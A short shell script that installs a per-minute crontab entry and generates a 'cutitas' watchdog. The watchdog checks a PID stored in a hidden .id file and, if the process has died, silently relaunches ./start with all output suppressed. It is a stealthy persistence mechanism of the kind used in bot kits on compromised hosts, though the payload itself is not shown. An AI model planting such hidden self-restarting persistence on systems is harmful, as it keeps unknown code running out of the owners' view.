#!/bin/sh
pwd > k.dir
dir=$(cat k.dir)
echo "* * * * * $dir/cutitas >/dev/null 2>&1" > cron.d
crontab cron.d
crontab -l | grep cutitas
echo "#!/bin/sh
if test -r $dir/.id; then
pid=\$(cat $dir/.id)
if \$(kill -CHLD \$pid >/dev/null 2>&1)
then
exit 0
fi
fi
cd $dir
./start &>/dev/null" > cutitas
chmod u+x cutitas
